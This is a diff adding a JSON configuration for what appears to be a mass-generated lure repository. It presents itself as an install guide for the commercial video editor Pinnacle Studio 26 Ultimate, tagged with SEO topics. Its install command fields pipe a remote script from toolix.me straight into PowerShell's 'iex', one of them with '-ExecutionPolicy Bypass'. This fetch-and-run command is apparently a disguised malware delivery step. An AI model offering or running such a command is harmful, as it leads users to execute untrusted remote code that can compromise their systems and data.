@@ -1,0 +1,29 @@
+{
+  "repo": "Pinnacle-Studio-26-Ultimate-Video-Windows-Install",
+  "product": "Pinnacle Studio 26 Ultimate Video Windows Install",
+  "product_title": "Pinnacle Studio 26 Ultimate Video Windows Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "video-editing",
+  "topics": [
+    "how-to-install-pinnacle-video-windows-install",
+    "pinnacle-video-windows-install-app",
+    "content-creator",
+    "gameplay-recording",
+    "screen-capture",
+    "directx-capture",
+    "video-export",
+    "media-capture",
+    "pinnacle-video-windows-install-video-tool",
+    "pinnacle-video-windows-install-editing-workflow",
+    "pinnacle-video-windows-install",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
